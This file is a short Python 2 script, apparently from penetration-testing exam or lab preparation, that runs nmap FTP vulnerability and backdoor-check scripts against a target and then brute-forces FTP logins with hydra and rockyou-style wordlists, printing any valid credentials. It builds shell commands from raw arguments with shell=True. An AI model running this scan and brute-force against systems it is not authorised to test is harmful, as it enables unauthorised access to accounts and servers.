#!/usr/bin/env python

# modified by forScience. Original by Mike Czumak (T_v3rn1x)
# paths have been customised

import subprocess
import sys
import os

if len(sys.argv) != 3:
    print "Usage: ftprecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()
print "[+] Performing nmap FTP script scan for " + ip_address + ":" + port
FTPSCAN = "nmap -sV -Pn -vv -p %s --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN '/root/EXAM/myrecon/results/%s/FTP-%s-%s.nmap' %s" %(port, ip_address, port, ip_address, ip_address)
results = subprocess.check_output(FTPSCAN, shell=True)

# WRITING TO A FILE TWICE?
#outfile = "/root/EXAM/myrecon/results/" + ip_address.rstrip() + "/ftprecon" + ip_address.rstrip() + "_ftprecon.txt"
#f = open(outfile, "w")
#f.write(results)
#f.close

print "[+] Performing a quick little hydra bruteforce against FTP on " + ip_address + ":" + port
HYDRA = "hydra -L /root/Tools/Wordlists/userlist_mini.txt -P /root/Tools/Wordlists/rockyou_mini.txt -t 4 -f -o /root/EXAM/myrecon/results/%s/FTP.%s.hydra -u %s -s %s ftp" %(ip_address, ip_address, ip_address, port)
results = subprocess.check_output(HYDRA, shell=True)
resultarr = results.split("\n")
for result in resultarr:
    if "login:" in result:
        print "[!] Valid ftp credentials found: " + result 
